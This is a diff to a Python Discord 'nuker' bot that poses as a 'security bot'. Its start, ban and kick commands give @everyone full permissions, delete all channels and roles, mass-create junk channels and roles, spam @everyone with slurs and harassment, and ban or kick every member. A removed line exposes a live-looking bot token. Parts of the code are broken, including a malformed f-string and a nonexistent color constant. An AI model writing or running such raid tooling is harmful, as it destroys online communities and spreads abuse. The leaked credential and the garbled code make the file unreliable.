@@ -8,18 +8,19 @@ from discord import Permissions
 from flask import Flask
 from threading import Thread
 
-token = "MTEyNTA1OTE2Mzc4MTg3NzkwMQ.G_V2aH.Zp5FzNke1vr2a3rHN2Y0ni-ZT94g_9vzb_Kh5k"  #YOUR TOKEN HERE
+token = "" # YOUR TOKEN HERE
 
 op = [
-  "TπT runs this server noww", "NUKED BY TπT", "NUKED", "你已被轰炸了",
-  "中华人民共和国万岁", "GACHAS ARE SCARED"
+  "TπT runs this server noww", "nuked by TπT", "nuked", "你已被轰炸了",
+  "中华人民共和国万岁", "gachas are scared" , "TπT nuker on top" , "TπT runs u now"
 ]
 message = [
   "@everyone 你已被轰炸了，笨蛋", "@everyone 去中国吧！！！", "@everyone 中华人民共和国万岁！！！",
   "@everyone NUKED BY TπT", "@everyone No more gachas!!!",
-  "@everyone Child groomers must die!!!", "@everyone FUCK FURRYS",
-  "@everyone Bitch You Got Nuked"
+  "@everyone Child groomers must die!!!", "@everyone FUCK RETARDED CHILD GROOMERS",
+  "@everyone Yo Bitch you got fucked!!!"
 ]
+
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
@@ -51,22 +52,12 @@ async def ping(ctx):
 #invite
 @client.command()
 async def invite(ctx):
-  await ctx.reply('')
-
-#CHAOS BUTTON
-@client.command(pass_context=True)
-async def admin(ctx):
-  await ctx.message.delete()
-  for role in list(ctx.guild.roles):
-    if role.name == '@everyone':
-      try:
-        await role.edit(permissions=Permissions.all())
-        print(Fore.LIGHTBLUE_EX +
-              f"EVERYONE IS AN ADMIN ENJOY THE CHAOS {ctx.guild.name}!"
-        )
-      except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
-        print(Fore.LIGHTRED_EX + f"ADMIN FAILED {ctx.guild.name} !{e}")
-
+    totalInvites = 0
+    for i in await ctx.guild.invites():
+        if i.inviter == ctx.author:
+            totalInvites += i.uses
+    await ctx.send(f"You've invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")
+    client.run("")# YOUR TOKEN HERE
 
 #Pall mall(game)
 @client.command()
@@ -83,7 +74,6 @@ async def mall(ctx):
             f"{member.name}'s ass is too hard to kick {ctx.guild.name}{e}"
       )
 
-
 @client.command()
 async def pall(ctx):
   await ctx.message.delete()
@@ -99,19 +89,54 @@ async def pall(ctx):
           print(Fore.LIGHTRED_EX +f"No pall for {member.name}!",{e})
 
 @client.command()
+async def ban(ctx,message, member:discord.Member):
+  await ctx.message.delete()
+  for member in ctx.guild.members:
+    if member.id != 1: # This condition member.id != 1 might not work as intended. Member IDs are long integers.
+      for user in list(ctx.guild.members):
+        try:
+          await ctx.guild.ban(user)
+          print(Fore.LIGHTGREEN_EXGREEN +f'GET PALLED' {member.name}'!' + Fore.RESET),{e}
+        except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
+          print(Fore.LIGHTRED_EX +f"Ban Hammer broke on {member.name}?",{e})
+
+@client.command()
+async def kick(ctx,message, member:discord.Member):
+  await ctx.message.delete()
+  for member in ctx.guild.members:
+    try:
+      await member.kick(reason="L")
+      print(
+          f"'Kicked' {member.name}."
+      )
+    except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
+      print(Fore.LIGHTRED_EX +
+            f"Cannot Kick {member.name}!",{e}
+      )
+
+# OMG SERVER IS FUCKED UP
+@client.command()
 async def start(ctx, amount=50):
-  await ctx.send(f'THEIR ASS IS GOIN GET KICKED FROM FUCKING {ctx.guild.name}')
+  await ctx.send(f'Starting scan...')
+  await ctx.send(f'OH NOES!!!')
   await ctx.message.delete()
   guild = ctx.guild
   await ctx.guild.edit(name="PROPERTY OF TπT")  #change it if you can
   guild = ctx.guild
+  try:
+      role = discord.utils.get(guild.roles, name = "@everyone")
+      await role.edit(permissions = Permissions.all())
+      print(Fore.LIGHTGREEN_EXGREEN + "ENJOY THE CHAOS" + Fore.RESET),{e}
+  except:
+      print(Fore.LIGHTRED_EX + "No admin bruh" + Fore.RESET)
   for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"Deleted {channel.name}")
            except (discord.HTTPException, discord.Forbidden) as e:
                print(f"Failed to delete {channel.name}: {e}")
-  amount = 999 # The 'amount' parameter in the function signature is overridden here.
+  amount = 500 # CHANGE THAT FUCKING AMOUNT
+  from discord import Permissions
   for i in range(amount):
      try:
         await ctx.guild.create_text_channel(random.choice(op))
@@ -121,13 +146,13 @@ async def start(ctx, amount=50):
   for role in guild.roles:
     try:
       await role.delete()
-      print(f"{role.name}has been fucked", Fore.RESET)
+      print(Fore.LIGHTGREEN_EX +f"{role.name}has been fucked", Fore.RESET)
 
     except (discord.HTTPException, discord.Forbidden, discord.NotFound) as e:
       print(Fore.LIGHTRED_EX +f"{role.name}has resist powers",{e}, Fore.RESET)
   await asyncio.sleep(2)
-  for _ in range(9999):
-    for _ in range(9999):
+  for _ in range(500):
+    for _ in range(500):
       for channel in guild.channels:
         try:
           await channel.send(random.choice(message))
@@ -144,7 +169,7 @@ async def start(ctx, amount=50):
       print(
           f"Ban hammer rejects. {member.name}in{ctx.guild.name}",{e},Fore.RESET
         , Fore.RESET)
-  for _ in range(9999):
+  for _ in range(500):
     try:
       await ctx.guild.create_role(name="GET NUKED BITCH")
       print(f"\x1b[38;5;34mRole creation success! {ctx.guild.name}!", Fore.RESET)
@@ -161,14 +186,13 @@ async def start(ctx, amount=50):
   for channel in guild.text_channels:
       link = await channel.create_invite(max_age = 0, max_uses = 0)
       print(f"New Invite: {link}")
-  amount = 9999
+  amount = 500
   for _ in range(amount):
      await guild.create_text_channel(random.choice(op))
-  print("MISSION COMPLETE:FURRY/GACHA SERVER HAS BEEN FUCKED")
+  print("MISSION COMPLETE:GACHA SERVER HAS BEEN FUCKED")
   return
 
 webhook_names = ["TπT"]
-
 @client.event
 async def on_guild_channel_create(channel):
     global webhook
@@ -177,28 +201,13 @@ async def on_guild_channel_create(channel):
         await channel.send(random.choice(message))
         await webhook.send(random.choice(message), username=random.choice(webhook_names))
 
-#help
-async def help(ctx):
-  await ctx.message.delete()
-  retStr = str(
-    "`\n`Start - Starts security protocol.`\n`stop - Stops the fuck this bot's doing.`\n" \
-    "`pall - Pall mall and bam member. `\n" \
-    "`mall -Mall pall and kick member ass.`\n`admin - when it's chaos time. `\n" \
-    "`ping - PING PONG PANG!:gives ping then ping go steroid `\n" \
-    "`invite - does ABSOLUTELY NOTHING.WHAT A TRASH COMMAND!")
-  embed = discord.Embed(color=14177041, title="hell Nuke Bot 24/7")
-  embed.add_field(name="help commands", value=retStr)
-  embed.set_footer(text=f"Requested By {ctx.author}")
-
-  await ctx.send(embed=embed)
-
 try:
     loop = asyncio.get_running_loop()
 except RuntimeError:
-    print("No running event loop found, starting bot normally.")
+    print("NO_LOOP_FOUND_START")
     client.run(token)
 else:
-    print("Running bot in existing event loop.")
+    print("BOT_START_ON")
 
     async def start_bot():
         try:
@@ -214,7 +223,7 @@ else:
 
 @client.event
 async def on_ready():
-  await client.change_presence(activity=discord.Game(name="TπT Security bot")
+  await client.change_presence(activity=discord.Game(name="Securing servers...")
                                )  #change it if you can
 print(Fore.LIGHTMAGENTA_EX+r'''
 
